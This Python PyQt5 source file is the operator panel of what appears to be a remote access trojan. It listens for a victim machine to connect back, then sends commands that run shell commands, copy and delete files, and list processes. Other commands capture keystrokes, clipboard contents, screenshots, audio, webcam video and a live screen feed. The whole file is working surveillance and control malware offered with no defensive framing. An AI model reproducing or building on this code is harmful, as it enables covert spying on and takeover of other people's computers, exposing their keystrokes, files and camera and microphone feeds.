from datetime import datetime
import struct
import cv2
import pickle
import numpy as np
import threading
from PyQt5.QtWidgets import (QLineEdit, QWidget, 
                             QPushButton, QToolTip, 
                             QLabel, QVBoxLayout, QMessageBox)
from PyQt5.QtGui import QFont, QColor
from PyQt5.QtCore import Qt
from .connection_module import (wait_for_connection, get_file_and_write,
                               send_string_into_connection, read_string_from_connection,
                               receive_image)
import tempfile
import os 

class Server(QWidget):
    def __init__(self):
        super().__init__()
        self.is_connected = False
        self.initUI()
         
    def initUI(self):
        QToolTip.setFont(QFont('SansSerif', 10))
        self.setToolTip('Server')

        main_layout = QVBoxLayout()
        button_layout = QVBoxLayout()
        control_layout = QVBoxLayout()

        button_data = [
            ('System Information', self.gather_system_info),
            ('CMD', self.command_line_interface),
            ('File And Directory Discovery', self.file_and_directory_discovery),
            ('Remote File Copy', self.remote_file_copy),
            ('File Deletion', self.file_deletion),
            ('Process Discovery', self.process_discovery),
            ('Input Capture', self.input_capture),
            ('Clipboard Data', self.clipboard_data),
            ('Screen Capture', self.screenshot_capture),
            ('Audio Capture', self.audio_capture),
            ('Video Capture', self.video_capture),
            ('Screen Capture', self.screen_capture),
            ('Stop', self.stop), 
            ('Listen', self.establish_connection),
        ]

        for text, function in button_data:
            button = QPushButton(text)
            button.clicked.connect(function)
            button.setStyleSheet("QPushButton {"
                                 "    background-color: #4CAF50;"
                                 "    color: white;"
                                 "    border: 1px solid #4CAF50;"
                                 "    border-radius: 4px;"
                                 "    padding: 5px;"
                                 "    min-width: 100px;"
                                 "}"
                                 "QPushButton:hover {"
                                 "    background-color: #45a049;"
                                 "    border: 1px solid #45a049;"
                                 "}"
                                 "QPushButton:pressed {"
                                 "    background-color: #3c883b;"
                                 "    border: 1px solid #3c883b;"
                                 "}")

            button_layout.addWidget(button)

        self.text_box = QLineEdit()
        self.text_box.setPlaceholderText("Port")

        self.text_box.setStyleSheet("QLineEdit {"
                                    "    border: 1px solid #4CAF50;"
                                    "    qproperty-alignment: 'AlignTop | AlignLeft';"
                                    "    padding: 5px;"
                                    "}")
        
        self.connection_status_label = QLabel("Not connected")
        self.connection_status_label.setStyleSheet("QLabel {"
                                                   "    border: 1px solid #4CAF50;"
                                                   "    qproperty-alignment: 'AlignTop | AlignLeft';"
                                                   "}")

        control_layout.addWidget(self.text_box)
        control_layout.addWidget(self.connection_status_label)

        main_layout.addLayout(button_layout)
        main_layout.addLayout(control_layout)

        self.setLayout(main_layout)

        self.setStyleSheet("QWidget {"
                           "   background-color: #f0f0f0;"
                           "}")

        self.setGeometry(300, 300, 400, 600)
        self.setWindowTitle('Server')
        self.show()

    def update_connection_status(self, os, ip):
        os = "Windows" if os == "W" else "Linux" 
        status_text = f"Connected: {os}, IP: {ip}"
        self.connection_status_label.setText(status_text)

    def establish_connection(self):
        try:
            port = int(self.text_box.text())
            if port < 0 or port > 65535:
                raise ValueError("Invalid port number")
            self.connection, self.address = wait_for_connection(port)
            self.connected_operation_system = self.connection.recv(1).decode()
            self.connected_ip, _ = self.address
            self.update_connection_status(self.connected_operation_system, self.connected_ip)
            self.text_box.clear()
            self.is_connected = True
        except ValueError as ve:
            self.show_error_message(f"Value Error: {str(ve)}")
        except Exception as e:
            self.show_error_message(f"Error: {str(e)}")

    def show_error_message(self, error_text):
        error_box = QMessageBox()
        error_box.setIcon(QMessageBox.Critical)
        error_box.setText("Error: " + error_text)
        error_box.setWindowTitle("Error Message")
        error_box.exec_()

    def gather_system_info(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"1")
            date = str(datetime.now()).replace(":", "")
            get_file_and_write(self.connection, "sys_info" + date + ".txt")
        except Exception as e:
            self.show_error_message(f"{str(e)}")
        
    def command_line_interface(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"2")
            send_string_into_connection(self.connection, self.text_box.text())
            date = str(datetime.now()).replace(":", "")
            get_file_and_write(self.connection, "cmd_output_" + self.text_box.text() + "_" + date + "_.txt")
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def file_and_directory_discovery(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"3")
            date = str(datetime.now()).replace(":", "")
            filename = "FileAndDirectoryDiscovery" + date + ".txt"
            get_file_and_write(self.connection, filename)
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def remote_file_copy(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"4")
            filename = self.text_box.text()
            send_string_into_connection(self.connection, filename)
            get_file_and_write(self.connection, filename.split("/")[-1])
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def file_deletion(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"5")
            filename = self.text_box.text()
            send_string_into_connection(self.connection, filename)
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def process_discovery(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"6")
            date = str(datetime.now()).replace(":", "")
            get_file_and_write(self.connection, "ProcessDiscovery_output" + date + ".txt")
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def input_capture(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"7")
            date = str(datetime.now()).replace(":", "")
            get_file_and_write(self.connection, "keylogger " + date + ".txt")
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def clipboard_data(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"8")
            res = read_string_from_connection(self.connection)
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def screenshot_capture(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"9")
            date = str(datetime.now()).replace(":", "")
            get_file_and_write(self.connection, "screenshot" + date + ".png")
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def audio_capture(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"A")
            seconds_to_record = str(self.text_box.text())
            send_string_into_connection(self.connection, seconds_to_record)
            date = str(datetime.now()).replace(":", "")
            get_file_and_write(self.connection, "AudioCapture_" + date + "_.wav")
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def video_capture(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"B")
            data = b''
            size = struct.calcsize("L")
            while True:
                self.connection.send(b"continue")
                while len(data) < size:
                    data += self.connection.recv(4096)
                packed_msg_size = data[:size]
                data = data[size:]
                msg_size = struct.unpack("L", packed_msg_size)[0]
                while len(data) < msg_size:
                    data += self.connection.recv(4096)
                frame_data = data[:msg_size]
                data = data[msg_size:]
                frame = pickle.loads(frame_data)
                cv2.imshow('frame', frame)
                if cv2.waitKey(1) & 0xFF == ord('x') or 0xFF == ord("ч"):
                    self.connection.send(b"stop")
                    break
            cv2.destroyAllWindows()
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def screen_capture(self):
        if not self.is_connected:
            self.show_error_message("You are not connected to any client.")
            return
        try:
            self.connection.send(b"C")
            cv2.namedWindow('Screen Video', cv2.WINDOW_NORMAL)
            while True:
                frame = receive_image(self.connection)
                    
                if frame is not None and frame.size > 0:
                    cv2.imshow('Screen Video', frame)
                    if cv2.waitKey(1) & 0xFF == ord("q"):
                        self.connection.sendall("STOP".encode('utf-8'))
                        break
                else:
                    print("Failed to decode image data or received frame with invalid dimensions.")
        except Exception as e:
            self.show_error_message(str(e))


    def stop(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"S")
        except Exception as e:
            self.show_error_message(f"{str(e)}")